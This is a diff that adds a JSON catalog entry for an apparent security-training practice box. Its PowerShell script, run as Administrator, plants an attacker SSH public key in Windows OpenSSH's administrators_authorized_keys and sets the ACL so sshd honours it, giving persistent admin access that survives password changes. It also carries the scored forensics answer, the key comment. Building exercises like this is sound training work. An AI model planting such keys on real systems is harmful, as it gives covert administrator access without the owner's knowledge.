@@ -1,0 +1,10 @@
+{
+  "name": "windows-ssh-authorized-keys",
+  "description": "Practice-box helper (Windows): plants an attacker ed25519 public key into the OpenSSH administrators_authorized_keys file (%ProgramData%\\ssh) -- key-based re-entry into the Administrators group that survives password rotation (C3rberus-derived). The hardened state is a file with no planted key. Vars: PUBLIC_KEY (optional -- a single-line 'ssh-ed25519 <b64> <comment>' entry; the catalog ships a working default whose comment the forensics question scores). Applies the mandatory ACL (SYSTEM + Administrators only, inheritance off) so sshd actually accepts the file. Idempotent (skips when the exact key line is present). Pairs with a file_regex check (no planted key line) and a forensics question on the key comment.",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "type": "powershell",
+  "run_as": "Administrator",
+  "script": "if (-not $PUBLIC_KEY) { $PUBLIC_KEY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC+87fQqivwcQBJAfHk36WXTjDHc5zvpNV0FQEpyjciV anvil-backup' }\n$dir = \"$env:ProgramData\\ssh\"\nNew-Item -ItemType Directory -Force -Path $dir | Out-Null\n$file = Join-Path $dir 'administrators_authorized_keys'\nif (Test-Path $file) {\n    $have = (Get-Content $file -ErrorAction SilentlyContinue) -contains $PUBLIC_KEY\n} else { $have = $false }\nif (-not $have) { Add-Content -Path $file -Value $PUBLIC_KEY }\nicacls $file /inheritance:r /grant 'SYSTEM:F' 'BUILTIN\\Administrators:F' | Out-Null\nWrite-Output \"attacker deploy key present in $file\"\n",
+  "depends_on": []
+}
